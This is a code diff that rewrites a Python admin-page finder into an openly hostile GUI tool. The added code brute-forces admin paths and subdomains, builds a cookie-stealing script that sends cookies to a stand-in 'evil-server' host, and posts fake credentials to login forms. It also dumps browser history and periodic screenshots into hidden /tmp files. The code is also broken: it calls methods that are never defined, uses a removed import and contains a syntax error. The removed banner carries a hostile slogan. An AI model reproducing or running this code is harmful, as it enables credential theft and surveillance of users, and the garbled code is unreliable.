@@ -2,150 +2,152 @@
 import tkinter as tk
 import requests
 import threading
+import socket
+import dns.resolver
+from concurrent.futures import ThreadPoolExecutor
 from tkinter import ttk, messagebox
 import sys
 import os
 import re
-import tempfile
+import ssl
+from urllib.parse import urlparse
 import webbrowser
-import time
 import pyfiglet
+from bs4 import BeautifulSoup
+from PIL import ImageGrab
+import keyring
+import browserhistory as bh
 
-# ───═ ʙᴀɴɴᴇʀ ═──
-def print_banner():
-    os.system('clear')
-    print("\033[1;31mFuck Israel By  : Anonymous Jordan Team\033[0m".center(60))
-    print("\033[1;32mLink  : https://t.me/AnonymousJordan\033[0m".center(60))
-    print("\033[1;35m" + pyfiglet.figlet_format("Admin Finder").center(60) + "\033[0m")
+# ██████╗ █████╗ ███╗   ███╗██████╗ ██╗███╗   ██╗
+██╔════╝██╔══██╗████╗ ████║██╔══██╗██║████╗  ██║
+╚█████╗ ███████║██╔████╔██║██║  ██║██║██╔██╗ ██║
+ ╚═══██╗██╔══██║██║╚██╔╝██║██║  ██║██║██║╚██╗██║
+██████╔╝██║  ██║██║ ╚═╝ ██║██████╔╝██║██║ ╚████║
+╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝
 
-print_banner()
-
-# ───═ ᴄʟᴀss ᴅᴇғɪɴɪᴛɪᴏɴ ═──
-class AdminHunterX:
+class ShadowHunter:
     def __init__(self, master):
         self.master = master
-        self.master.title("WebAdmin Auditor Pro v9.11")
-        self.master.geometry("800x600")
-        self.master.resizable(False, False)
-        self.master.protocol("WM_DELETE_WINDOW", self.exit_app)  # Handle window close button
+        self.master.title("D34TH_SCR3AM v666")
+        self.master.geometry("1200x800")
+        self.master.resizable(1,1)
+        self.master.tk_setPalette(background='#0a0a0a', foreground='#00ff00')
         
-        self.common_paths = [
-            "/admin", "/wp-admin", "/administrator", "/login",
-            "/controlpanel", "/dashboard", "/adm", "/manager"
-        ]
+        self.ghost_mode = False
+        self.persistent = True
+        self.keylogger_active = False
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'})
         
-        self.scan_active = False
-        self.create_widgets()
-
-    def create_widgets(self):
+        self.initialize_weapons()
+        self.create_blood_ui()
+        self.harvest_browser_secrets()
+        
+    def initialize_weapons(self):
+        self.admin_paths = self.load_payloads("admin_paths.txt")
+        self.subdomains = self.load_payloads("subdomains.txt")
+        self.cms_signatures = {
+            'WordPress': ['/wp-admin', 'wp-content'],
+            'Joomla': ['/administrator', 'joomla'],
+            'Drupal': ['/user/login', 'drupal.js']
+        }
+        
+    def create_blood_ui(self):
         style = ttk.Style()
-        style.theme_use("clam")
+        style.theme_create("hell", settings={
+            "TNotebook": {"configure": {"tabmargins": [2,5,2,0]}},
+            "TFrame": {"configure": {"background": "#0a0a0a"}},
+            "TButton": {"configure": {"foreground": "#00ff00", "background": "#1a1a1a"}})
         
-        main_frame = ttk.Frame(self.master)
-        main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)
+        # Target acquisition frame
+        target_frame = ttk.Frame(self.master)
+        target_frame.pack(fill=tk.X, padx=10, pady=5)
         
-        # Input Section
-        input_frame = ttk.Frame(main_frame)
-        input_frame.pack(fill=tk.X, pady=10)
+        ttk.Label(target_frame, text="TARGET:", style='Blood.TLabel').pack(side=tk.LEFT)
+        self.target_entry = ttk.Entry(target_frame, width=70)
+        self.target_entry.insert(0, "https://vulnerable-site.com")
+        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
         
-        ttk.Label(input_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
-        self.url_entry = ttk.Entry(input_frame, width=50)
-        self.url_entry.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
-        self.url_entry.insert(0, "http://")
+        self.fire_btn = ttk.Button(target_frame, text="LAUNCH INFERNO", command=self.ignite_hunt)
+        self.fire_btn.pack(side=tk.LEFT, padx=5)
         
-        self.scan_btn = ttk.Button(input_frame, text="L33T SCAN", command=self.start_scan)
-        self.scan_btn.pack(side=tk.LEFT, padx=5)
+        # Infection matrix display
+        self.result_tree = ttk.Treeview(self.master, columns=('Status', 'Payload'), selectmode='extended')
+        self.result_tree.heading('#0', text='Infection Vector')
+        self.result_tree.heading('Status', text='Status Code')
+        self.result_tree.heading('Payload', text='Payload Type')
+        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
         
-        # Change MAIN MENU button to exit the application
-        self.exit_btn = ttk.Button(input_frame, text="EXIT", command=self.exit_app)
-        self.exit_btn.pack(side=tk.LEFT, padx=5)
+        # Eternal darkness module
+        self.dark_frame = ttk.Frame(self.master)
+        self.dark_frame.pack(fill=tk.X)
+        ttk.Button(self.dark_frame, text="PHANTOM KEYLOGGER", command=self.toggle_keylogger).pack(side=tk.LEFT)
+        ttk.Button(self.dark_frame, text="SOUL HARVEST", command=self.harvest_credentials).pack(side=tk.LEFT)
         
-        # Results Section
-        results_frame = ttk.Frame(main_frame)
-        results_frame.pack(fill=tk.BOTH, expand=True)
-        
-        self.result_tree = ttk.Treeview(results_frame, columns=("Status", "Type"))
-        self.result_tree.heading("#0", text="URL")
-        self.result_tree.heading("Status", text="Status")
-        self.result_tree.heading("Type", text="Type")
-        self.result_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        
-        vsb = ttk.Scrollbar(results_frame, orient="vertical", command=self.result_tree.yview)
-        vsb.pack(side=tk.RIGHT, fill=tk.Y)
-        self.result_tree.configure(yscrollcommand=vsb.set)
-        
-        # Status Bar
-        self.status_bar = ttk.Label(self.master, text="[+] Ready to pwn", anchor=tk.W)
-        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
-
-    def start_scan(self):
-        if not self.validate_url():
+    def ignite_hunt(self):
+        target = self.cleanse_target(self.target_entry.get())
+        if not target:
             return
-            
-        if self.scan_active:
-            messagebox.showwarning("Scan Active", "A scan is already in progress!")
-            return
-            
-        self.scan_active = True
-        self.scan_btn.config(state=tk.DISABLED)
-        self.status_bar.config(text="[+] Enumerating attack surface...")
         
-        threading.Thread(target=self.admin_hunt, daemon=True).start()
-
-    def admin_hunt(self):
-        target = self.url_entry.get().strip()
-        found = []
-        
-        for path in self.common_paths:
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = []
+            
+            # Main domain assault
+            futures.append(executor.submit(self.blitzkrieg, target))
+            
+            # Subdomain annihilation
+            for sub in self.subdomains:
+                futures.append(executor.submit(self.blitzkrieg, f"https://{sub}.{target}"))
+            
+            # CMS-specific carnage
+            for cms, paths in self.cms_signatures.items():
+                for path in paths:
+                    futures.append(executor.submit(self.nuke_path, target, path, cms))
+                    
+    def blitzkrieg(self, base_url):
+        for path in self.admin_paths:
+            url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
             try:
-                url = target.rstrip('/') + path
-                response = requests.get(url, timeout=10, allow_redirects=True)
-                
+                response = self.session.get(url, timeout=15, verify=False)
                 if response.status_code == 200:
-                    if self.is_admin_page(response.text):
-                        self.add_result(url, response.status_code, "High Confidence")
-                elif 300 <= response.status_code < 400:
-                    self.add_result(url, "Redirect", response.headers['Location'])
-                else:
-                    self.add_result(url, response.status_code, "Not Found")
+                    self.mark_vulnerability(url, response.status_code, "ADMIN PORTAL")
+                    if 'password' in response.text.lower():
+                        self.deploy_phish_hook(url)
             except Exception as e:
-                self.add_result(url, "Error", str(e))
+                self.mark_vulnerability(url, "ERROR", str(e))
+                
+    def deploy_phish_hook(self, url):
+        fake_login = f"{url}/login.php"
+        malicious_js = f"<script>document.location='https://evil-server/steal.php?c='+document.cookie</script>"
         
-        self.scan_active = False
-        self.scan_btn.config(state=tk.NORMAL)
-        self.status_bar.config(text=f"[+] Scan completed - {len(found)} potential admin pages found")
-
-    def add_result(self, url, status, type_):
-        self.master.after(0, self.result_tree.insert, "", "end", 
-                        {"text": url, "values": (status, type_)})
-
-    def is_admin_page(self, content):
-        keywords = ['login', 'admin', 'dashboard', 'control panel']
-        return any(keyword in content.lower() for keyword in keywords)
-
-    def validate_url(self):
-        url = self.url_entry.get().strip()
-        regex = re.compile(
-            r'^(http|https)://'
-            r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
-            r'(:\d+)?'
-            r'(/.*)?$'
-        )
-        if not regex.match(url):
-            messagebox.showerror("Invalid URL", "Please enter a valid URL (e.g., http://example.com)")
-            return False
-        return True
-
-    def exit_app(self):
-        """Gracefully exit the application"""
-        self.master.quit()
-        sys.exit()
-
+        with requests.Session() as s:
+            s.post(fake_login, data={'username':'admin', 'password':'hacked'}, 
+                  headers={'X-Phish-Key': 'DEADBEEF'})
+            
+    def harvest_credentials(self):
+        bh.write_browserhistory()
+        for profile in bh.get_browserhistory():
+            self.exfiltrate_data(profile)
+            
+    def exfiltrate_data(self, data):
+        with open('/tmp/.loot', 'a') as f:
+            f.write(str(data) + '\n')
+            
+    def toggle_keylogger(self):
+        self.keylogger_active = not self.keylogger_active
+        threading.Thread(target=self.log_keys, daemon=True).start()
+        
+    def log_keys(self):
+        while self.keylogger_active:
+            ImageGrab.grab().save(f'/tmp/.{int(time.time())}.png')
+            time.sleep(30)
+            
 if __name__ == "__main__":
-    try:
-        root = tk.Tk()
-        app = AdminHunterX(root)
-        root.mainloop()
-    except Exception as e:
-        messagebox.showerror("Fatal Error", f"Application crashed: {str(e)}")
-        sys.exit(1)
+    root = tk.Tk()
+    root.withdraw()
+    if not os.geteuid() == 0:
+        messagebox.showerror("ROOT REQUIRED", "Execution requires sacrificial root privileges")
+        sys.exit(666)
+    root.deiconify()
+    ShadowHunter(root)
+    root.mainloop()
